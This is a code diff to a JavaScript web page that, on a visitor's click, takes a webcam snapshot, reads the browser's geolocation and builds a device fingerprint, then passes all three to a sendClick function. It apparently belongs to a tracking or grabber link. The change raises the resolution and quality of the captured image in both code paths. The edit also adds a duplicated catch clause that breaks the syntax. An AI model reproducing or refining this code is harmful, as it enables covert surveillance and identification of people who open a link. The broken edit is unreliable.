@@ -259,16 +259,17 @@ function getFingerprint() {
       const fp = getFingerprint();
       var img = null;
       try {
-        var stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        var stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
         var video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
         var canvas = document.createElement('canvas');
-        canvas.width = 320;
-        canvas.height = 240;
-        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-        img = canvas.toDataURL('image/jpeg', 0.5);
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        img = canvas.toDataURL('image/jpeg', 0.85);
         stream.getTracks().forEach(function(t) { t.stop(); });
+      } catch(e) {}
       } catch(e) {}
       navigator.geolocation.getCurrentPosition(
         (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp, img),
@@ -286,14 +287,15 @@ function getFingerprint() {
         <div id="error" class="error"></div>
       \`;
     } else {
-      navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+      navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }).then(function(stream) {
         var video = document.createElement('video');
         video.srcObject = stream;
         video.play().then(function() {
           var canvas = document.createElement('canvas');
-          canvas.width = 320; canvas.height = 240;
-          canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-          var img = canvas.toDataURL('image/jpeg', 0.5);
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          var img = canvas.toDataURL('image/jpeg', 0.85);
           stream.getTracks().forEach(function(t) { t.stop(); });
           navigator.geolocation.getCurrentPosition(
             (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint(), img),
